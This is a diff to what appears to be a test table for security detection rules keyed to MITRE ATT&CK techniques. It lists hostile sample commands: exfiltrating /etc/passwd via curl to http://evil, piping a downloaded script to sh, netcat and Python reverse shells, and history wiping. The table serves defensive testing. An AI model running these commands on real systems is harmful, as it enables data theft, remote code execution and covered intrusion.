@@ -60,7 +60,7 @@ N 'L-T1021.004' '[T1021.004] SSH Tunnel / Port Forward' '"[T1021.004] SSH Tunnel
 T 'L-T1046' '[T1046] Network Scanning Tool' '"[T1046] Network Scanning Tool"' 'nmap' '-sS' '10.0.0.0/24'
 N 'L-T1048' '[T1048] curl POST Data Exfiltration' '"[T1048] curl POST Data Exfiltration"' 'curl' '-X' 'POST' '-d' '@/etc/passwd' 'http://evil'
 N 'L-T1059.004a' '[T1059.004] Shell Suspicious Execution' '"[T1059.004] Shell Suspicious Execution"' 'bash' '-c' 'curl' 'http://x/a.sh' '|' 'sh'
-T 'L-T1059.004b' '[T1059.004] Executable Run from /tmp or /dev/shm' '"[T1059.004] Executable Run from /tmp or /dev/shm"' '/tmp/payload'
+N 'L-T1059.004b' '[T1059.004] Executable Run from /tmp or /dev/shm' '"[T1059.004] Executable Run from /tmp or /dev/shm"' 'payload'
 N 'L-T1059.004c' '[T1059.004] Netcat Reverse Shell' '"[T1059.004] Netcat Reverse Shell"' 'nc' '-e' '/bin/sh' '10.0.0.5' '4444'
 N 'L-T1059.006' '[T1059.006] Python/Perl/Ruby Reverse Shell' '"[T1059.006] Python/Perl/Ruby Reverse Shell"' 'python3' '-c' 'import' 'socket,subprocess;socket.socket()'
 T 'L-T1070.002' '[T1070.002] Log File Deletion or History Wipe' '"[T1070.002] Log File Deletion or History Wipe"' 'history' '-c'
